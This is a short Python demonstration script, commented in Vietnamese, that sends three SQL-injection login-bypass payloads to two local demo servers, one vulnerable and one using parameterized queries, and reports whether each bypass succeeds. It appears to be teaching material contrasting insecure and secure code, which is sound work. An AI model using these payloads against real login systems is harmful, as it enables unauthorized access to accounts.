"""
Mo phong SQL Injection nham vao endpoint /login cua 2 server demo
(vulnerable_server.py va hardened_server.py). Chi chay nham vao
127.0.0.1 trong sandbox nay -- KHONG dung script nay nham vao bat ky
dia chi mang thuc te nao.

Chay:
    python3 vulnerable_server.py &   # port 8081
    python3 hardened_server.py &     # port 8082
    python3 attack_sqli.py
"""
import json
import urllib.request

PAYLOADS = [
    ("admin' -- ", "bat ky"),                       # comment het phan check password
    ("' OR '1'='1' -- ", "bat ky"),                  # WHERE luon dung
    ("nonexistent' OR '1'='1", "bat ky"),            # bo qua ca username that
]


def call(port, username, password):
    req = urllib.request.Request(
        f"http://127.0.0.1:{port}/login",
        data=json.dumps({"username": username, "password": password}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=3) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def run(label, port):
    print(f"\n=== {label} (port {port}) ===")
    for payload, pw in PAYLOADS:
        status, body = call(port, payload, pw)
        outcome = "BYPASS THANH CONG (dang nhap duoc!)" if status == 200 else "bi chan"
        print(f"  payload username={payload!r:45} -> HTTP {status} [{outcome}] {body}")


if __name__ == "__main__":
    run("VULNERABLE (naive SQL string concat)", 8081)
    run("HARDENED (giong AuthService that -- JPA parameterized query)", 8082)
